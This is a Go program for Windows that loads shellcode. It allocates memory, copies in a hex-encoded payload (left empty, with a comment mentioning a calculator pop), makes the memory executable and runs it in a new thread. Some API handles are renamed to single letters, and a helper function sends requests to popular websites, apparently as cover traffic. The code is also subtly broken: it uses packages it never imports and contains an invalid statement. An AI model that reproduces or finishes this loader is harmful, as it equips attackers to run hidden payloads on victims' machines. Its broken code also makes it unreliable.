package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"sync"
	"time"

	"golang.org/x/sys/windows"
)

const (
	MEM_COMMIT   = 0x1000
	MEM_RESERVE  = 0x2000
	PAGE_EXECUTE = 0x20
	PAGE_READWRITE = 0x04
)

func main() {
	varise := flag.Bool("verbose", false, "Enable verbose output")
	dubbe := flag.Bool("debug", false, "Enable debug output")
	flag.Parse()

	// Pop Calc Shellcode
	scShell, errShellcode := hex.DecodeString("")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	if *dubbe {
		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll")
	}
	kernelDLL := windows.NewLazySystemDLL("kernel32.dll")
	ntdllDLL := windows.NewLazySystemDLL("ntdll.dll")

	if *dubbe {
		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect and RtlCopyMemory procedures")
	}
	a := kernelDLL.NewProc("VirtualAlloc")
	b := kernelDLL.NewProc("VirtualProtect")
	c := ntdllDLL.NewProc("RtlCopyMemory")
	d := kernelDLL.NewProc("CreateThread")
	e := kernelDLL.NewProc("WaitForSingleObject")

	if *dubbe {
		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
	}
	f, _, errVirtualAlloc := a.Call(0, uintptr(len(scShell)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if f == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	if *varise {
		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(scShell)))
	}

	if *dubbe {
		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory")
	}
	_, _, errRtlCopyMemory := c.Call(f, uintptr(unsafe.Pointer((*byte)(unsafe.Pointer(&scShell[0])))), uintptr(len(scShell)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}
	if *varise {
		fmt.Println("[-]Shellcode copied to memory")
	}

	if *dubbe {
		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
	}

	oldProt := PAGE_READWRITE
	_, _, errVirtualProtect := b.Call(f, uintptr(len(scShell)), PAGE_EXECUTE, uintptr(unsafe.Pointer((*uintptr)(unsafe.Pointer(&oldProt)))))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}
	if *varise {
		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
	}

	if *dubbe {
		fmt.Println("[DEBUG]Calling CreateThread...")
	}

	threadID, _, errCreateThread := d.Call(0, 0, f, uintptr(0), 0, 0)

	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", errCreateThread.Error()))
	}
	if *varise {
		fmt.Println("[+]Shellcode Executed")
	}

	if *dubbe {
		fmt.Println("[DEBUG]Calling WaitForSingleObject...")
	}

	_, _, errWaitForSingleObject := e.Call(threadID, 0xFFFFFFFF)
	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error()))
	}
}

func requestAlexaDomains() {
	domains := []string{"www.yandex.ru", "www.google.com", "www.facebook.com"}
	for i := 0; i < 3; i++ {
		go func(domain string) {
			resp, err := http.Get("https://" + domain + "/")
			if err != nil {
				log.Println("Error making request:", err)
			} else {
				resp.Body.Close()
				log.Println("Successfully made request to", domain)
			}
		}(domains[i])
	}
}

func main2() {
	requestAlexaDomains()
	sync.WaitGroup{}
}
